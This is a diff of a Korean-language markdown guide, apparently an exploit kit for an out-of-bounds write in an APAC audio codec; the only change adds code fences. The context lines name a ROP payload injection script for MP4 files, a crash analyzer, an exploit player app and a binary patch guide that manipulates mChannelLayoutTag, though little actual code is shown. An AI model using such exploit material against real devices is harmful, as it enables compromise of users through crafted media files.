@@ -34,7 +34,7 @@ chmod +x mp4_rop_convert.sh
 
 
 
-
+```bash
 #!/bin/bash
 # File: mp4_rop_convert.sh
 # Description: Automate ROP payload injection and conversion to APAC MP4
@@ -55,7 +55,7 @@ afconvert -o "$OUTPUT_MP4" -d apac -f mp4f "$PATCHED_CAF"
 
 echo "[+] Generated $OUTPUT_MP4"
 
-
+```
 
 
 # 🎯 APAC ROP Payload 자동 삽입 도구
@@ -196,7 +196,7 @@ aa bb cc dd ...
 
 
 
-
+```python
 # File: apac_oob_analyzer.py
 # Description: LLDB script to detect and dump OOB memory access from mRemappingArray-based access
 
@@ -248,7 +248,7 @@ def dump_and_analyze_oob(frame, bp_loc, dict):
     else:
         print(f"[!] Failed to read frame buffer memory at 0x{frame_buffer_ptr:x}")
 
-
+```
 
 
 # APAC Exploit Crash 분석 도구 사용법
@@ -392,7 +392,7 @@ done
 
 ---
 
-
+```swift
 
 // File: APACExploitPlayer.swift
 // Platform: macOS or iOS (SwiftUI/macCatalyst supported)
@@ -440,7 +440,7 @@ struct ContentView: View {
 }
 
 
-
+```
 
 
 # APAC MP4 바이너리 패치 가이드: mChannelLayoutTag 조작으로 OOB 유도
@@ -592,7 +592,7 @@ Stream #0:0: Audio: none (apac / 0x63617061), 48000 Hz, 4.0, ...
 
 이 파일은 `mRemappingArray`와 실제 오디오 채널 수의 불일치를 유도하여, APACChannelRemapper 내부의 OOB Write 취약점을 실험적으로 유도할 수 있습니다.
 
-
+```python
 
 
 # generate_apac_test_audio.py
@@ -619,7 +619,7 @@ sf.write(filename, data, samplerate, subtype='PCM_16')
 print(f"[+] Created multi-channel WAV file: {filename}")
 
 
-
+```
 
 
 
